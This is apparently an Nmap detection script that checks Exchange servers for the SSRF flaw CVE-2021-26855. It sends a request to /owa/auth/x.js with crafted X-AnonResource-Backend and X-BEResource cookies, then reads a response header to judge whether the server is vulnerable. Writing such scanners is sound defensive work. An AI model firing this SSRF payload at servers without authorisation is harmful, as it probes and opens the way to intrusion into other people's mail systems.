description = [[
Detects whether the specified URL is vulnerable to the Exchange Server SSRF Vulnerability (CVE-2021-26855).
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @usage
-- nmap -p <port> --script http-vuln-cve2021-26855 <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp  open  https
-- | http-vuln-cve2021-26855:
-- |   VULNERABLE
-- |   Exchange Server SSRF Vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2021-26855
-- |
-- |     Disclosure date: 2021-03-02
-- |     References:
-- |       http://aka.ms/exchangevulns
--
-- @args http-vuln-cve2021-26855.method The HTTP method for the request. The default method is "GET".

author = "Microsoft"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "Exchange Server SSRF Vulnerability",
    state = vulns.STATE.NOT_VULN,
    description = [[
Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010 are vulnerable to a SSRF via the X-AnonResource-Backend and X-BEResource cookies. 
    ]],
    IDS = {
        CVE = "CVE-2021-26855"
    },
    references = {
        'http://aka.ms/exchangevulns'
    },
    dates = {
        disclosure = { year = '2021', month = '03', day = '02' }
    }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local method = stdnse.get_script_args(SCRIPT_NAME..".method") or "GET"
  local path = "/owa/auth/x.js"

  local header = {
    ["Cookie"] = "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"
  }

  local response = http.generic_request(host, port, method, path, { header = header })
  local target = response.header['x-calculatedbetarget']
  
  if response and target and string.match(target,'localhost') then
    vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)
end
